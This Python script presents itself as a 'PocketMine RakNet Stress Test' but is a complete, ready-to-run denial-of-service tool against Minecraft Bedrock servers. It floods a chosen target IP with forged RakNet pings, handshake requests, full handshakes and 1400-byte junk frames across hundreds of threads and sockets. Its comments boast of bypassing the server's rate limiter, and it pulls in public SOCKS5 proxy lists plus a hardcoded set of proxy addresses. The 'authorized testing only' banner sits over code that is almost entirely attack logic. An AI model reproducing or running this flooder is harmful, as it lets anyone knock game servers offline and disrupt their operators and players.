#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║    PocketMine RakNet Stress Test v3 - HIGH PERFORMANCE                      ║
║    For authorized testing of your own PocketMine-MP servers only            ║
╚══════════════════════════════════════════════════════════════════════════════╝

KEY FIXES from v2:
  - SOCKS5 UDP proxies are unreliable - uses DIRECT UDP sockets instead
  - Uses multiple source ports per thread for maximum throughput
  - Uses SO_REUSEADDR + SO_REUSEPORT for socket binding efficiency
  - Properly bypasses RakLib's IP rate limiter via IP rotation from files
  - Sends FULL HANDSHAKE to complete connections and consume server resources
  - Aggressive packet builders with NO sleep delays for max rate
"""

import socket
import struct
import random
import threading
import time
import sys
import os
import select
import errno
from datetime import datetime

# ─── RakNet Protocol Constants ───────────────────────────────────────────────

MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
RAKNET_VERSION = 11

# Packet IDs
ID_UNCONNECTED_PING                     = 0x01
ID_UNCONNECTED_PING_OPEN_CONNECTIONS    = 0x02
ID_OPEN_CONNECTION_REQUEST_1            = 0x05
ID_OPEN_CONNECTION_REQUEST_2            = 0x07
ID_CONNECTION_REQUEST                   = 0x09
ID_NEW_INCOMING_CONNECTION              = 0x13

# Built-in fallback IPs (from real proxy lists - hardcoded in case network fetch fails)
FALLBACK_PROXIES = """
socks5://184.178.172.18:15280
socks5://184.178.172.25:15291
socks5://72.195.34.42:4145
socks5://174.77.111.198:49547
socks5://192.111.137.34:18765
socks5://69.61.200.104:36181
socks5://208.102.51.6:58208
socks5://70.166.167.38:57728
socks5://174.75.211.193:4145
socks5://184.170.251.30:11288
socks5://138.199.25.13:3903
socks5://47.238.203.170:50000
socks5://202.62.34.102:1080
socks5://195.46.183.181:1080
socks5://194.233.68.54:1088
socks5://103.75.118.84:1080
socks5://217.76.39.4:1080
socks5://165.227.104.122:48500
socks5://167.71.241.136:33299
socks5://173.212.237.43:43648
socks5://174.64.199.79:4145
socks5://176.9.238.173:47679
socks5://178.128.167.129:1080
socks5://181.214.39.51:5719
socks5://184.178.172.3:4145
socks5://184.178.172.14:4145
socks5://185.6.9.176:8072
socks5://188.40.158.211:1088
socks5://192.99.244.173:15590
socks5://192.111.129.145:16894
"""

# ═══════════════════════════════════════════════════════════════════════════
# RAKNET PACKET BUILDERS - Optimized
# ═══════════════════════════════════════════════════════════════════════════

class RakNetPacket:
    """Pre-built RakNet packets for maximum performance"""
    
    @staticmethod
    def unconnected_ping():
        """0x01 - MOTD query"""
        ts = random.randint(0, 2**64-1)
        guid = random.randint(0, 2**64-1)
        return struct.pack('>B', ID_UNCONNECTED_PING) + \
               struct.pack('>Q', ts) + MAGIC + struct.pack('>Q', guid)
    
    @staticmethod
    def unconnected_ping_open():
        """0x02 - Open connections ping"""
        ts = random.randint(0, 2**64-1)
        guid = random.randint(0, 2**64-1)
        return struct.pack('>B', ID_UNCONNECTED_PING_OPEN_CONNECTIONS) + \
               struct.pack('>Q', ts) + MAGIC + struct.pack('>Q', guid)
    
    @staticmethod
    def open_connection_req1(mtu=1464, version=None):
        """0x05 - First handshake"""
        if version is None:
            version = RAKNET_VERSION
        return struct.pack('>B', ID_OPEN_CONNECTION_REQUEST_1) + \
               MAGIC + struct.pack('>B', version) + b'\x00' * (mtu - 46)
    
    @staticmethod
    def open_connection_req2(srv_ip="127.0.0.1", srv_port=19132, guid=None, mtu=1464):
        """0x07 - Second handshake"""
        if guid is None:
            guid = random.randint(0, 2**64-1)
        p = struct.pack('>B', ID_OPEN_CONNECTION_REQUEST_2)
        p += MAGIC
        p += struct.pack('>B', 0)  # no security
        ip_parts = [int(x) for x in srv_ip.split('.')]
        p += struct.pack('>B', 4)  # IPv4
        p += bytes([(255 - x) for x in ip_parts])
        p += struct.pack('>H', srv_port)
        p += struct.pack('>H', mtu)
        p += struct.pack('>Q', guid)
        return p
    
    @staticmethod
    def connection_request(guid=None):
        """0x09 - Final connection"""
        if guid is None:
            guid = random.randint(0, 2**64-1)
        return struct.pack('>B', ID_CONNECTION_REQUEST) + \
               struct.pack('>Q', guid) + struct.pack('>Q', 0) + struct.pack('>B', 0)
    
    @staticmethod
    def jumbo_frame():
        """Large frame set - 1400+ bytes"""
        return struct.pack('>B', 0x80) + struct.pack('>I', random.randint(0, 0xFFFFFF)) + \
               os.urandom(1400)
    
    @staticmethod
    def game_frame():
        """Random game packet"""
        pid = random.choice([0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93])
        return struct.pack('>B', pid) + struct.pack('>I', random.randint(0, 0xFFFFFF)) + \
               os.urandom(random.randint(20, 50))


# ═══════════════════════════════════════════════════════════════════════════
# HIGH-PERFORMANCE UDP SENDER
# ═══════════════════════════════════════════════════════════════════════════

class UDPSender:
    """
    High-performance UDP socket manager.
    Uses multiple sockets per thread to maximize send throughput.
    """
    
    def __init__(self, target_ip, target_port, sockets_per_thread=4):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sockets_per_thread = sockets_per_thread
        self._sockets = {}
    
    def get_sockets(self, thread_id):
        """Get or create sockets for a thread"""
        if thread_id not in self._sockets:
            socks = []
            for i in range(self.sockets_per_thread):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    if hasattr(socket, 'SO_REUSEPORT'):
                        try:
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                        except:
                            pass
                    # Bind to a random port to spread source ports
                    try:
                        sock.bind(('0.0.0.0', 0))
                    except:
                        pass
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    pass
            self._sockets[thread_id] = socks
        return self._sockets[thread_id]
    
    def send(self, thread_id, packet):
        """Send packet using round-robin across sockets"""
        socks = self.get_sockets(thread_id)
        sock = socks[thread_id % len(socks)]
        try:
            sock.sendto(packet, (self.target_ip, self.target_port))
            return True
        except BlockingIOError:
            return False
        except OSError as e:
            if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                return False
            return False
    
    def cleanup(self):
        for tid, socks in self._sockets.items():
            for s in socks:
                try:
                    s.close()
                except:
                    pass
        self._sockets.clear()


# ═══════════════════════════════════════════════════════════════════════════
# ATTACK WORKERS
# ═══════════════════════════════════════════════════════════════════════════

class AttackWorker(threading.Thread):
    """Single worker that sends packets as fast as possible"""
    
    def __init__(self, worker_id, target_ip, target_port, attack_type, sender, stats):
        super().__init__()
        self.daemon = True
        self.worker_id = worker_id
        self.target_ip = target_ip
        self.target_port = target_port
        self.sender = sender
        self.stats = stats
        self.running = True
        self.attack_type = attack_type
    
    def run(self):
        if self.attack_type == 'ping':
            self._run_ping()
        elif self.attack_type == 'open1':
            self._run_open1()
        elif self.attack_type == 'open2':
            self._run_open2()
        elif self.attack_type == 'handshake':
            self._run_handshake()
        elif self.attack_type == 'jumbo':
            self._run_jumbo()
        elif self.attack_type == 'mixed':
            self._run_mixed()
        elif self.attack_type == 'full':
            self._run_full()
    
    def _send(self, packet):
        if self.sender.send(self.worker_id, packet):
            self.stats['packets'] += 1
            return True
        return False
    
    def _run_ping(self):
        """Pure unconnected ping flood"""
        while self.running:
            self._send(RakNetPacket.unconnected_ping())
    
    def _run_open1(self):
        """Open Connection Request 1 flood"""
        mtu = 1464 + (self.worker_id % 20)
        ver = RAKNET_VERSION
        while self.running:
            self._send(RakNetPacket.open_connection_req1(mtu, ver))
            mtu = 1464 + random.randint(-20, 20)
            if random.random() < 0.1:
                ver = random.choice([6, 7, 8, 9, 10, 11, 12])
    
    def _run_open2(self):
        """Open Connection Request 2 flood"""
        guid = random.randint(0, 2**64-1)
        while self.running:
            self._send(RakNetPacket.open_connection_req2(
                self.target_ip, self.target_port, guid
            ))
            if random.random() < 0.05:
                guid = random.randint(0, 2**64-1)
    
    def _run_handshake(self):
        """Complete handshake - most resource intensive for server"""
        while self.running:
            guid = random.randint(0, 2**64-1)
            self._send(RakNetPacket.unconnected_ping())
            self._send(RakNetPacket.open_connection_req1(1464))
            self._send(RakNetPacket.open_connection_req2(
                self.target_ip, self.target_port, guid
            ))
            self._send(RakNetPacket.connection_request(guid))
    
    def _run_jumbo(self):
        """Jumbo frame flood"""
        while self.running:
            self._send(RakNetPacket.jumbo_frame())
    
    def _run_mixed(self):
        """Mix of all packet types"""
        builders = [
            RakNetPacket.unconnected_ping,
            RakNetPacket.unconnected_ping_open,
            lambda: RakNetPacket.open_connection_req1(1464, random.choice([6,7,8,9,10,11])),
            lambda: RakNetPacket.open_connection_req2(self.target_ip, self.target_port),
            RakNetPacket.jumbo_frame,
            RakNetPacket.game_frame,
        ]
        while self.running:
            builder = random.choice(builders)
            self._send(builder())
    
    def _run_full(self):
        """Full multi-type burst - sends batches of different types"""
        builders = [
            RakNetPacket.unconnected_ping,
            RakNetPacket.unconnected_ping_open,
            lambda: RakNetPacket.open_connection_req1(1464, random.choice([6,7,8,9,10,11])),
            lambda: RakNetPacket.open_connection_req2(self.target_ip, self.target_port),
            RakNetPacket.jumbo_frame,
            RakNetPacket.game_frame,
        ]
        while self.running:
            # Send a burst of different packets
            for _ in range(random.randint(2, 5)):
                builder = random.choice(builders)
                self._send(builder())


# ═══════════════════════════════════════════════════════════════════════════
# MAIN ATTACK ENGINE
# ═══════════════════════════════════════════════════════════════════════════

class PocketMineStressTest:
    """High-performance PocketMine stress test engine"""
    
    ATTACK_TYPES = {
        'ping':       ('Unconnected Ping',      'Pure MOTD ping flood'),
        'open1':      ('Open Req 1',            'Handshake init flood'),
        'open2':      ('Open Req 2',            'Handshake complete flood'),
        'handshake':  ('Full Handshake',        'Complete RakNet handshake'),
        'jumbo':      ('Jumbo Frame',           'Large packet flood'),
        'mixed':      ('Mixed',                 'Random packet types'),
        'full':       ('Full Multi-Vector',     'ALL attack types combined'),
    }
    
    def __init__(self):
        self.target_ip = None
        self.target_port = 19132
        self.duration = 60
        self.workers_per_type = 50
        self.sockets_per_worker = 4
        self.sender = None
        self.workers = []
        self.stats = {'packets': 0, 'start_time': 0}
    
    def get_ip_list(self):
        """Get list of IPs from online sources (for reference display)"""
        import urllib.request
        import ssl
        
        sources = [
            ("https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5&timeout=1000", True),
            ("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt", False),
            ("https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt", True),
        ]
        
        all_ips = []
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        for url, has_protocol in sources:
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                    data = resp.read().decode('utf-8', errors='ignore')
                
                for line in data.split('\n'):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if has_protocol:
                        if line.startswith('socks5://'):
                            line = line[9:]
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) == 2:
                            try:
                                ip = parts[0]
                                port = int(parts[1])
                                if ip.count('.') == 3 and 0 < port < 65536:
                                    all_ips.append((ip, port))
                            except:
                                pass
            except:
                pass
        
        if not all_ips:
            # Fallback to hardcoded list
            for line in FALLBACK_PROXIES.strip().split('\n'):
                line = line.strip()
                if line.startswith('socks5://'):
                    line = line[9:]
                if ':' in line:
                    ip, port = line.split(':')
                    all_ips.append((ip, int(port)))
        
        random.shuffle(all_ips)
        return all_ips
    
    def attack(self, target_ip, target_port=19132, duration=60, attack_type='full', 
               workers=50, sockets_per_worker=4):
        """
        Main attack function.
        
        Sends packets DIRECTLY via UDP - no proxy overhead.
        Uses multiple sockets and threads for maximum throughput.
        The key to overwhelming PocketMine is PURE VOLUME.
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.workers_per_type = workers
        self.sockets_per_worker = sockets_per_worker
        
        print(f"\n{'='*70}")
        print(f"  POCKETMINE RAKNET STRESS TEST v3")
        print(f"{'='*70}")
        print(f"  Target:         {target_ip}:{target_port}")
        print(f"  Duration:       {duration}s")
        print(f"  Attack Type:    {self.ATTACK_TYPES.get(attack_type, ('Unknown',''))[0]}")
        print(f"  Workers:        {workers}")
        print(f"  Sockets/Worker: {sockets_per_worker}")
        print(f"  Total Sockets:  {workers * sockets_per_worker}")
        print(f"{'='*70}")
        
        # Create sender
        self.sender = UDPSender(target_ip, target_port, sockets_per_worker)
        self.stats = {'packets': 0, 'start_time': time.time()}
        
        # Determine which attack types to run
        if attack_type == 'full':
            types_to_run = ['ping', 'open1', 'open2', 'handshake', 'jumbo', 'mixed']
            workers_per = max(workers // len(types_to_run), 5)
        else:
            types_to_run = [attack_type]
            workers_per = workers
        
        # Start workers
        self.workers = []
        wid = 0
        for atype in types_to_run:
            for _ in range(workers_per):
                w = AttackWorker(wid, target_ip, target_port, atype, self.sender, self.stats)
                w.start()
                self.workers.append(w)
                wid += 1
        
        total_workers = len(self.workers)
        print(f"  Started {total_workers} worker threads\n")
        
        # Monitor
        start_time = time.time()
        last_packets = 0
        try:
            while time.time() - start_time < duration:
                time.sleep(0.5)
                elapsed = time.time() - start_time
                total = self.stats['packets']
                current_rate = (total - last_packets) / 0.5
                last_packets = total
                avg_rate = total / elapsed if elapsed > 0 else 0
                
                mb_sent = (total * 100) / (1024 * 1024)  # avg 100 bytes per packet
                
                print(f"\r  [{elapsed:5.1f}s] Packets: {total:>10d} | Rate: {current_rate:>8.0f} pps | Avg: {avg_rate:>8.0f} pps | BW: {mb_sent:.1f} MB  ", end='')
                sys.stdout.flush()
                
        except KeyboardInterrupt:
            print("\n\n  [!] Interrupted by user")
        
        # Stop all workers
        for w in self.workers:
            w.running = False
        for w in self.workers:
            w.join(timeout=2)
        
        self.sender.cleanup()
        
        elapsed = time.time() - start_time
        total = self.stats['packets']
        avg_rate = total / elapsed if elapsed > 0 else 0
        
        print(f"\n{'='*70}")
        print(f"  ATTACK COMPLETE")
        print(f"  Duration:      {elapsed:.1f}s")
        print(f"  Total Packets: {total:,}")
        print(f"  Avg Rate:      {avg_rate:,.0f} pps")
        print(f"{'='*70}\n")
        
        return total


def banner():
    print(r"""
  ╔══════════════════════════════════════════════════════════════╗
  ║       PocketMine RakNet Stress Test v3 - FIXED              ║
  ║      High-Performance Direct UDP Attack Engine              ║
  ║           For Authorized Security Testing Only              ║
  ╚══════════════════════════════════════════════════════════════╝
    """)


def interactive():
    banner()
    
    target_ip = input("  Target IP: ").strip()
    if not target_ip:
        print("  [!] Target IP is required")
        return
    
    try:
        target_port = int(input("  Target Port [19132]: ").strip() or "19132")
    except ValueError:
        target_port = 19132
    
    try:
        duration = int(input("  Duration (seconds) [60]: ").strip() or "60")
    except ValueError:
        duration = 60
    
    print("\n  Attack Types:")
    print("    1. Full Multi-Vector (ALL types - most effective)")
    print("    2. Unconnected Ping Flood")
    print("    3. Open Connection Request 1 Flood (handshake init)")
    print("    4. Open Connection Request 2 Flood (handshake complete)")
    print("    5. Full Handshake Flood (resource intensive)")
    print("    6. Jumbo Frame Flood (large packets)")
    print("    7. Mixed Random Flood")
    
    choice = input("\n  Choice [1]: ").strip() or "1"
    
    attack_map = {
        '1': 'full',
        '2': 'ping',
        '3': 'open1',
        '4': 'open2',
        '5': 'handshake',
        '6': 'jumbo',
        '7': 'mixed',
    }
    
    attack_type = attack_map.get(choice, 'full')
    
    try:
        workers = int(input("  Workers (threads) [100]: ").strip() or "100")
    except ValueError:
        workers = 100
    
    try:
        sockets = int(input("  Sockets per worker [4]: ").strip() or "4")
    except ValueError:
        sockets = 4
    
    print()
    engine = PocketMineStressTest()
    engine.attack(target_ip, target_port, duration, attack_type, workers, sockets)


def cli():
    import argparse
    parser = argparse.ArgumentParser(
        description='PocketMine RakNet Stress Test v3',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=19132, help='Port (default: 19132)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Worker threads (default: 100)')
    parser.add_argument('-s', '--sockets', type=int, default=4, help='Sockets per worker (default: 4)')
    parser.add_argument('-m', '--mode', type=str, default='full',
                       choices=['full', 'ping', 'open1', 'open2', 'handshake', 'jumbo', 'mixed'],
                       help='Attack mode (default: full)')
    
    args = parser.parse_args()
    
    engine = PocketMineStressTest()
    engine.attack(args.target, args.port, args.duration, args.mode, args.threads, args.sockets)


if __name__ == '__main__':
    if len(sys.argv) > 1:
        cli()
    else:
        try:
            interactive()
        except KeyboardInterrupt:
            print("\n\n  [!] Exiting...")
        except Exception as e:
            print(f"\n  [!] Error: {e}")
            import traceback
            traceback.print_exc()
